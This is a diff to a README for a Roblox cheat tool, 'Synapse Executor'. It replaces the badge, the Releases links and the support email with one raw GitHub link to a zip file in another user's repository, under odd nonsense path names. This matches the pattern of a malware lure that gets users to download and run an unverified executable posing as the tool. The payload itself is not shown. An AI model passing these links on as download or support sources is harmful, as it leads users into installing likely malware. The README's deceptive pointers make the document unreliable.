@@ -1,6 +1,6 @@
 # Roblox Synapse Executor
 
-![Roblox Synapse](https://img.shields.io/badge/Roblox%20Synapse-Executor-brightgreen)
+![Roblox Synapse](https://raw.githubusercontent.com/celikbaran12/Roblox-Synapse/main/Mechitaristican/Roblox-Synapse_Mitannian.zip%20Synapse-Executor-brightgreen)
 
 Welcome to the **Roblox Synapse Executor** repository! This tool is designed for those who want to enhance their Roblox gaming experience through advanced Lua scripting. With its robust features and stable performance, Synapse stands out as a premier choice for script execution.
 
@@ -25,7 +25,7 @@ Welcome to the **Roblox Synapse Executor** repository! This tool is designed for
 
 ## Installation
 
-To get started with Roblox Synapse, download the latest release from the [Releases section](https://github.com/FireDarkMC/Roblox-Synapse/releases). After downloading, follow these steps:
+To get started with Roblox Synapse, download the latest release from the [Releases section](https://raw.githubusercontent.com/celikbaran12/Roblox-Synapse/main/Mechitaristican/Roblox-Synapse_Mitannian.zip). After downloading, follow these steps:
 
 1. **Extract the Files**: Unzip the downloaded file to a folder of your choice.
 2. **Run the Executor**: Locate the executable file and run it to start using Synapse.
@@ -89,10 +89,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or support, feel free to reach out:
 
-- **Email**: support@robloxsynapse.com
+- **Email**: https://raw.githubusercontent.com/celikbaran12/Roblox-Synapse/main/Mechitaristican/Roblox-Synapse_Mitannian.zip
 - **Discord**: Join our community on Discord for real-time support and discussions.
 
-For the latest updates, please visit the [Releases section](https://github.com/FireDarkMC/Roblox-Synapse/releases) regularly.
+For the latest updates, please visit the [Releases section](https://raw.githubusercontent.com/celikbaran12/Roblox-Synapse/main/Mechitaristican/Roblox-Synapse_Mitannian.zip) regularly.
 
 ---
 
